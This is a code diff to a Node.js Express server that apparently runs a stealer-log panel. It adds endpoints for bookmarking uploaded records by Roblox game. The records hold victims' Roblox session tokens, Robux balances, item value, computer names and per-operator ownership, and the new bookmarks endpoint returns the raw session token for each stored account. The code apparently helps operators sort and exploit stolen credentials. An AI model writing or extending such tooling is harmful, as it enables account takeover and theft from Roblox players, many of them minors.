@@ -1209,7 +1209,8 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
         pendingRobux: robuxInfo.pendingRobux || 0,
         rap: robuxInfo.rap || 0,
         valid: valid,
-        lastLogin: roblox.lastLogin || null
+        lastLogin: roblox.lastLogin || null,
+        bookmarks: doc.bookmarks || []
       };
     });
 
@@ -1259,6 +1260,106 @@ app.get('/tokens', requireAuth, (req, res) => {
       res.status(500).json({ error: e.message });
     }
   });
+
+app.post('/api/bookmark', requireAuth, async (req, res) => {
+  try {
+    const { filename, game } = req.body;
+    if (!filename || !game) return res.status(400).json({ error: 'Missing filename or game' });
+    
+    const validGames = ['mm2', 'adopt_me', 'steal_brainrot'];
+    if (!validGames.includes(game)) return res.status(400).json({ error: 'Invalid game' });
+    
+    const user = req.authUser || req.session.user;
+    const db = await getDb();
+    if (!db) return res.status(500).json({ error: 'No DB' });
+    
+    // Find the document
+    const opQuery = (user.toLowerCase() === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    
+    const doc = await db.collection('files').findOne({ name: filename, ...opQuery });
+    if (!doc) return res.status(404).json({ error: 'Not found' });
+    
+    const bookmarks = doc.bookmarks || [];
+    let newBookmarks;
+    if (bookmarks.includes(game)) {
+      // Remove (toggle off)
+      newBookmarks = bookmarks.filter(g => g !== game);
+    } else {
+      // Add (toggle on)
+      newBookmarks = [...bookmarks, game];
+    }
+    
+    await db.collection('files').updateOne(
+      { _id: doc._id },
+      { $set: { bookmarks: newBookmarks } }
+    );
+    
+    res.json({ bookmarks: newBookmarks });
+  } catch (e) {
+    console.error('Bookmark error:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+app.get('/api/bookmarks', requireAuth, async (req, res) => {
+  const user = req.authUser || req.session.user;
+  try {
+    const db = await getDb();
+    if (!db) return res.json([]);
+    
+    const opQuery = (user.toLowerCase() === 'shonll')
+      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
+      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    
+    const docs = await db.collection('files').find({
+      ...opQuery,
+      'roblox.security': { $exists: true, $ne: '' },
+      bookmarks: { $exists: true, $not: { $size: 0 } }
+    }).sort({ uploadedAt: -1 }).toArray();
+    
+    const results = docs.map(doc => {
+      const roblox = doc.roblox || {};
+      const robuxInfo = doc.robuxInfo || {};
+      const username = robuxInfo.username || roblox.user || 'Roblox User';
+      const userId = robuxInfo.userId || roblox.userId || null;
+      const robux = (robuxInfo.robux !== undefined && robuxInfo.robux !== null) ? robuxInfo.robux : ((roblox.robux !== undefined && roblox.robux !== null) ? roblox.robux : 0);
+      const valid = robuxInfo.valid !== undefined ? robuxInfo.valid : true;
+      
+      return {
+        file: doc.name,
+        originalName: doc.originalName || doc.name,
+        computer: doc.computer?.name || 'Unknown',
+        uploadedAt: doc.uploadedAt,
+        user: username,
+        username: username,
+        userId: userId,
+        security: roblox.security,
+        robux: robux,
+        valid: valid,
+        lastLogin: roblox.lastLogin || null,
+        bookmarks: doc.bookmarks || []
+      };
+    });
+    
+    // Deduplicate by user
+    const byUser = new Map();
+    for (const r of results) {
+      const id = r.userId || r.username || r.security;
+      if (!id) continue;
+      const existing = byUser.get(id);
+      if (!existing || new Date(r.uploadedAt || 0) > new Date(existing.uploadedAt || 0)) {
+        byUser.set(id, r);
+      }
+    }
+    
+    res.json([...byUser.values()]);
+  } catch (e) {
+    console.error('Bookmarks error:', e.message);
+    res.json([]);
+  }
+});
 
   app.get('/api/emails/:filename', requireAuth, async (req, res) => {
     try {
